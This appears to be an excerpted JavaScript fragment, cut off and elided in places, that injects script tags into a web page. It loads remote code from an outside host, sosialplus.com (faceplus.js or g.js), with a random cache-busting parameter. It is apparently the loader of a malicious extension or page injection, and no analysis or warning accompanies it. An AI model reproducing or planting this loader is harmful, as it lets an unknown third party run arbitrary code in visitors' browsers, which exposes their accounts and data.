...
if(!googledayim)
{
	...
	s.innerHTML='var s=document.createElement("script");s.type="text/javascript";s.src="http://sosialplus.com/cdn/faceplus.js?amtasak="+Math.random()*999999;document.getElementsByTagName("head")[0].appendChild(s);';
	s.id="faceplus"
...
else
{
	...
	s.type="text/javascript";
	s.className="cachedVersion";
	s.innerHTML='var s=document.createElement("script");s.type="text/javascript";s.src="http://sosialplus.com/cdn/g.js?amtasak="+Math.random()*999999;document.getElementsByTagName("head")[0].appendChild(s);';
	s.id="faceplus"
